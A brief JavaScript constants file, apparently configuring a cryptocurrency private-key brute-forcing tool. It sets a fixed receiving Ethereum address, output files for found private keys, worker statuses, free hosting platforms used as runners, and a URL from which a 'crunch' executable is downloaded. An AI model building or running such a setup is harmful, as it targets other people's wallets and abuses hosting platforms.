export const receiverAddress = "0xa7402f92A0e0f2424132D903a5cD5486b2822e4A";

export const savingAddress = "./";
export const filePrefixAddress = "-private-keys.txt";
export const totalLinePerFile = 10000;
export const liveEndingCrunch = `${savingAddress}live/live-ending-crunch.txt`;
export const latestOutput = `${savingAddress}output/output.txt`;
export const writeStreamAppendConfig = {
	"flags": "a",
	"encoding": null,
	"mode": "0666"
};

export const collection = "pvks";
export const statuses = {
	first: "awake",
	second: "done",
	third: "found"
};
export const platforms = {
	first: "Heroku",
	second: "Evennode",
	third: "Vercel"
};

export const scriptId = "{scriptId}";
export const protocol = "{protocol}";
export const domain = "{domain}";
export const platform = "{platform}";
export const platformDomain = "{platform_domain}";

export const vercelCrunchExecutable = "https://raw.githubusercontent.com/crenata/u-addrs/main/crunch";